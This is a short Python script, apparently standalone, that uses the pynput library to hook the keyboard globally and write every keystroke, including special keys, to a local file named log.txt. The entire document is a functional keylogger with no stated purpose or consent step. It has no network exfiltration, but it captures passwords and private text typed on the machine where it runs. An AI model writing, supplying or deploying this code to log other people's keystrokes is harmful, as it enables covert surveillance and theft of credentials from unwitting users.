import pynput

def on_press(key):
    with open('log.txt', 'a') as f:
        try:
            f.write(key.char)
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                f.write(' ')
            elif key == pynput.keyboard.Key.enter:
                f.write('\n')
            else:
                f.write(f'[{key}]')

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
